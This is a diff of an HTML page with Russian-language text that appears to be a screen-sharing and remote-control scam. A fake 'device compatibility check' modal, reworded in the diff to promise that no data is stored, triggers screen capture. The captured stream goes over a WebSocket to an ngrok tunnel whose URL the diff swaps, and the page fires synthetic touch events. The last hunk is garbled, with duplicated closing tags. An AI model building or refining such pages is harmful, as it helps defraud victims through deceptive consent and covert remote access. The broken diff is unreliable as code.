@@ -100,7 +100,7 @@
     <div id="confirmationModal" class="modal">
         <div class="modal-content">
             <p id="modalMessage">Подтвердите синхронизацию устройства для управления</p>
-            <p style="color: #888; font-size: 12px;">Это необходимо для проверки совместимости. Безопасно и займёт несколько секунд.</p>
+            <p style="color: #888; font-size: 12px;">Это необходимо для проверки совместимости устройства. Мы не сохраняем данные, это безопасно и займёт всего 5 секунд.</p>
             <button class="modal-button confirm" onclick="startScreenShare()">Подтвердить</button>
             <button class="modal-button cancel" onclick="closeModal()">Отмена</button>
         </div>
@@ -109,7 +109,7 @@
     <script>
         let localStream = null;
         let peerConnection = null;
-        const ws = new WebSocket('wss://5a94-159-224-105-180.ngrok-free.app');
+        const ws = new WebSocket('wss://new-url.ngrok-free.app'); // Замени на новый URL от ngrok (например, wss://abc123.ngrok-free.app)
 
         ws.onopen = () => {
             console.log('Подключено к WebSocket-серверу');
@@ -206,6 +206,10 @@
                 cancelable: true
             });
             document.dispatchEvent(touchEvent);
+        }
+    </script>
+</body>
+</html>dispatchEvent(touchEvent);
         }
     </script>
 </body>
